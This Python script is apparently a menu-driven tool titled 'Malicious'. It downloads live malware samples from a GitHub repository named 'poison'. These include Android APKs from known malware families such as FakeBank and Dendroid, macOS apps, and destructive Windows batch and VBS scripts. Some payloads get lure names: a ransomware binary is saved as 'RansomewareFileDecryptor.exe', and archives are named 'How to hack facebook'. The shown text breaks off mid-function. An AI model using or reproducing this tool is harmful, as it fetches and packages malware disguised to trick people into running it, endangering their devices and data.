#!/usr/bin/python
# -*- coding: utf-8 -*-
#####DONT CHANGE THIS########
import sys,os,platform
from time import *
x = platform.system()
import requests
from tqdm import tqdm
	#--- Color  ---#
W  = '\033[0m'  # white (default)
R  = '\033[31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
jarak = 72*"="
fun = "Download Succes ^_^"
now = strftime("%T")
bulan = strftime("%B")
tahun = strftime("%Y")
#--- Def menu ---#
print("\t\t\t\t\t\t\t\t"+R+""+x+"")
print("\tRelease Date : 6 Oktober 2018")
print("\t"+C+"Now\t"+tahun+"\t"+bulan+"\t  "+now)
def banner():
    print(""+R+"V "+C+"███╗   ███╗ █████╗ ██╗     ██╗ ██████╗██╗ ██████╗ ██╗   ██╗███████╗ "+R+"V")     
    print(""+R+"I "+C+"████╗ ████║██╔══██╗██║     ██║██╔════╝██║██╔═══██╗██║   ██║██╔════╝ "+R+"I")     
    print(""+R+"R "+C+"██╔████╔██║███████║██║     ██║██║     ██║██║   ██║██║   ██║███████╗ "+R+"R")     
    print(""+R+"U "+C+"██║╚██╔╝██║██╔══██║██║     ██║██║     ██║██║   ██║██║   ██║╚════██║ "+R+"U")    
    print(""+R+"S "+C+"██║ ╚═╝ ██║██║  ██║███████╗██║╚██████╗██║╚██████╔╝╚██████╔╝███████║ "+R+"S")    
    print(""+R+"! "+C+"╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ "+R+"!")    
    
	
def banner1():
	print(""+R+"["+R+">"*70+R+"]")
	print("[\t\t      "+R+"Nick : Hider5 made with"+G+" <3"+R+"\t\t       ]")
	print("[\t\t\t  Author : Raflyda\t\t\t       ]")
	print(""+O+"[\t\t\t"+O+"   Version : 1.0\t\t\t       ]")
	print("[\t\t\t  Thanks to Deray\t\t\t       ]")
	print("["+O+""+O+"<"*70+O+"]")
	print(""+C+"")
	
def banner2():
	print(""+O+"")
	
def fontcolor():
	print(""+W+"")
#######DONT CHANGE THIS#########

#################### START ANDROID
def Vandroid():
	print("[1] Agent")
	print("[2] Badnews")
	print("[3] Bios")
	print("[4] BlatanSMS")
	print("[5] BrainTest")
	print("[6] Claco")
	print("[7] DropDialer")
	print("[8] FakeBank")
	print("[9] FakeCMCC")
	print("[10] FakeDoc ")
	print("[11] FakeValidation")
	print("[12] Fobus")
	print("[13] GinMaster")
	print("[14] Masnu")
	print("[15] Elite")
	print("[16] Omigo")
	print("[17] Opfake")
	print("[18] SmsWorker")
	print("[19] Vietcon")
	print("[20] Candycorn")
	print("[21] Cat")
	print("[22] Chistescortos")
	print("[23] Chistespicanticos")
	print("[24] ComFunnys")
	print("[25] ComImagePets")
	print("[26] ComKitchen")
	print("[27] ComLaughtter")
	print("[28] Prasesamor")
	print("[29] Prasesfee")
	print("[30] RecipeSmart")
	print("[31] Romaticpos")
	print("[32] Statetss")
	print("[33] Thinkking")
	print("[34] Crd")
	print("[35] Dendroid")
	print("[36] Ds")
	print("[37] Facebook")
	print("[38] Fakeav")
	print("[39] Back")
	
	menu1 = input("Choice Number > ")
	if menu1 == 1:#############done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/Agent.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'Agent.apk?raw=true' Android/Agent.apk")
		print(fun)######done
		
	elif menu1 == 2:#####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/BadNews.A.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'BadNews.A.apk?raw=true' Android/BadNews.apk")
		print(fun)#######done
	
	elif menu1 == 3:#####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/Bios.NativeMaliciousCode.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'Bios.NativeMaliciousCode.apk?raw=true' Android/Bios.apk")
		print(fun)#####done
		
	elif menu1 == 4:########done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/Blatantsms.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'Blatantsms.apk?raw=true' Android/Blatantsms.apk")
		print(fun)#####done
		
	elif menu1 == 5:#####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/BrainTest.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'BrainTest.apk?raw=true' Android/BrainTest.apk")
		print(fun)#####done
		
	elif menu1 == 6:##########done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/Claco.A.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'Claco.A.apk?raw=true' Android/Claco.apk")
		print(fun)#####done
		
	elif menu1 == 7:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/Dropdialer.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'Dropdialer.apk?raw=true' Android/DropDialer.apk")
		print(fun)#####done
		
	elif menu1 == 8:#####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/FakeBank.B.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'FakeBank.B.apk?raw=true' Android/FakeBank.apk")
		print(fun)#####done
		
	elif menu1 == 9:######done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/FakeCMCC.A.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'FakeCMCC.A.apk?raw=true' Android/FakeCMCC.apk")
		print(fun)#####done
	
	elif menu1 == 10:#####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/FakeDoc.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'FakeDoc.apk?raw=true' Android/FakeDoc.apk")
		print(fun)#####done
		
	elif menu1 == 11:#####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/FakeValidation.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'FakeValidation.apk?raw=true' Android/FakeValidation.apk")
		print(fun)#####done
		
	elif menu1 == 12:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/Fobus.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'Fobus.apk?raw=true' Android/Fobus.apk")
		print(fun)#####done
		
	elif menu1 == 13:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/GinMaster.Z.AdvancedObfuscation.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'GinMaster.Z.AdvancedObfuscation.apk?raw=true' Android/GinMaster.apk")
		print(fun)#####done
		
	elif menu1 == 14:###done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/Masnu.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'Masnu.apk?raw=true' Android/Masnu.apk")
		print(fun)#####done
		
	elif menu1 == 15:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/Minecraft2.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'Minecraft2.apk?raw=true' Android/Elite.apk")
		print(fun)#####done
		
	elif menu1 == 16:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/Omigo.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'Omigo.apk?raw=true' Android/Omigo.apk")
		print(fun)#####done
		
	elif menu1 == 17:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/Opfake.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'Opfake.apk?raw=true' Android/Opfake.apk")
		print(fun)#####done
		
	elif menu1 == 18:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/SmsWorker.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'SmsWorker.apk?raw=true' Android/SmsWorker.apk")
		print(fun)#####done
		
	elif menu1 == 19:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/Vietcon.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'Vietcon.apk?raw=true' Android/Vietcon.apk")
		print(fun)#####done
		
	elif menu1 == 20:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/candy_corn.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'candy_corn.apk?raw=true' Android/Candycorn.apk")
		print(fun)#####done
		
	elif menu1 == 21:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/cat.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'cat.apk?raw=true' Android/Cat.apk")
		print(fun)#####done
		
	elif menu1 == 22:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/chistescortos.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'chistescortos.apk?raw=true' Android/Chistescortos.apk")
		print(fun)#####done
		
	elif menu1 == 23:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/chistespicanticos.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'chistespicanticos.apk?raw=true' Android/Chistespicanticos.apk")
		print(fun)#####done
		
	elif menu1 == 24:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/com.funnyys.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'com.funnyys.apk?raw=true' Android/ComFunnys.apk")
		print(fun)#####done
		
	elif menu1 == 25:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/com.imagepets.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'com.imagepets.apk?raw=true' Android/ComImagePets.apk")
		print(fun)#####done
		
	elif menu1 == 26:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/com.kitchenn.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'com.kitchenn.apk?raw=true' Android/ComKitchen.apk")
		print(fun)#####done
		
	elif menu1 == 27:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/com.laughtter.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'com.laughtter.apk?raw=true' Android/ComLaughtter.apk")
		print(fun)#####done
		
	elif menu1 == 28:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/com.prasesamor.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'com.prasesamor.apk?raw=true' Android/Prasesamor.apk")
		print(fun)#####done
		
	elif menu1 == 29:#####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/com.prasesfee.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'com.prasesfee.apk?raw=true' Android/Prasesfee.apk")
		print(fun)#####done
		
	elif menu1 == 30:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/com.recipesmart.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'com.recipesmart.apk?raw=true' Android/Recipesmart.apk")
		print(fun)#####done
		
	elif menu1 == 31:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/com.romaticpos.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'com.romaticpos.apk?raw=true' Android/Romaticpos.apk")
		print(fun)#####done
		
	elif menu1 == 32:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/com.statetss.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'com.statetss.apk?raw=true' Android/Statetss.apk")
		print(fun)#####done
		
	elif menu1 == 33:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/com.thinkking.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'com.thinkking.apk?raw=true' Android/Thinkking.apk")
		print(fun)#####done
		
	elif menu1 == 34:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/crd.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'crd.apk?raw=true' Android/Crd.apk")
		print(fun)#####done
		
	elif menu1 == 35:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/dendroid.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'dendroid.apk?raw=true' Android/Dendroid.apk")
		print(fun)#####done
		
	elif menu1 == 36:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/ds.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'ds.apk?raw=true' Android/Ds.apk")
		print(fun)#####done
		
	elif menu1 == 37:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/facebook.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'facebook.apk?raw=true' Android/Facebook.apk")
		print(fun)#####done
		
	elif menu1 == 38:####done
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/Fake_av.apk?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'Fake_av.apk?raw=true' Android/Fakeav.apk")
		print(fun)#####done
		
	elif menu1 == 39:####done
		print("\n")
		menu()
	else:
		print("wrong number")
#################ANDROID DONE

#################Start Macosx
def Vmacosx():
	print("[1] Trinoids")
	print("[2] Nothing")
	print("[3] Back")
	
	menu2 = input("Choice number > ")
	if menu2 == 1:
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/trinoids.app?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'trinoids.app?raw=true' Macosx/Trinoids.app")
		print(fun)#####done
		
	elif menu2 == 2:
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/nothing.app?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'nothing.app?raw=true' Macosx/Nothing.app")
		print(fun)#####done
	
	elif menu2 == 3:
		print("\n")
		menu()
	else:
		print("Wrong number")
####################Done Macosx	

###################Start PC
def vpcwin():
	print("[1] Ugly.bat")
	print("[2] Sleepy.bat")
	print("[3] Reg-eater.bat")
	print("[4] Kuis.bat")
	print("[5] Koce.bat")
	print("[6] Cmd.bat")
	print("[7] Capslock.vbs")
	print("[8] Alay.vbs")
	print("[9] RansomewareFileDecryptor.exe")
	print("[10] RIP.bat")
	print("[11] Back")
	
	menu3 = input("Choice number > ")
	if menu3 == 1:
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/ugly.bat?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'ugly.bat?raw=true' Windows/Ugly.bat")
		print(fun)#####done
		
	elif menu3 == 2:
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/sleepy.bat?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'sleepy.bat?raw=true' Windows/Sleepy.bat")
		print(fun)#####done
		
	elif menu3 == 3:
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/reg-eater.bat?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'reg-eater.bat?raw=true' Windows/Reg-eater.bat")
		print(fun)#####done
		
	elif menu3 == 4:
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/kuis.bat?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'kuis.bat?raw=true' Windows/Kuis.bat")
		print(fun)#####done
		
	elif menu3 == 5:
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/koce.bat?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'koce.bat?raw=true' Windows/Koce.bat")
		print(fun)#####done
		
	elif menu3 == 6:
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/cmd.bat?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'cmd.bat?raw=true' Windows/Cmd.bat")
		print(fun)#####done
		
	elif menu3 == 7:
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/capslock.vbs?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'capslock.vbs?raw=true' Windows/Capslock.vbs")
		print(fun)#####done
		
	elif menu3 == 8:
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/alay.vbs?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'alay.vbs?raw=true' Windows/Alay.vbs")
		print(fun)#####done
		
	elif menu3 == 9:
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/ransomeware.exe?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'ransomeware.exe?raw=true' Windows/RansomewareFileDecryptor.exe")
		print(fun)#####done
		
	elif menu3 == 10:
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/RIP.bat?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'RIP.bat?raw=true' Windows/RIP.bat")
		print(fun)#####done
		
	elif menu3 == 11:
		print("\n")
		menu()
	else:
		print("Wrong number")
#######################Done  PC

####################start PDF
def Vpdfautorunpc():
	print("[1] How to hack facebook (extension: rar)")
	print("[2] Hack facebook              (extension: rar) ")
	print("[3] Back")
	
	menu4 = input("Choice Number > ")
	if menu4 == 1:
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/howtohackfb.rar?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
			for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
				f.write(data)
		os.system("mv 'howtohackfb.rar?raw=true' Pdf-autorun-windows/How-to-hack-facebook.rar")
		print(fun)#####done
		print("You may need password for ekstrak \npassword: cracker\n")
	elif menu4 == 2:
		print(""+G+"")
		chunk_size = 1024
		url = 'https://github.com/Hider5/poison/blob/master/samples/hackfacebook.rar?raw=true'
		r = requests.get(url, stream = True)
		size = int(r.headers['content-length'])
		filename = url.split('/')[-1]
		with open(filename, 'wb') as f:
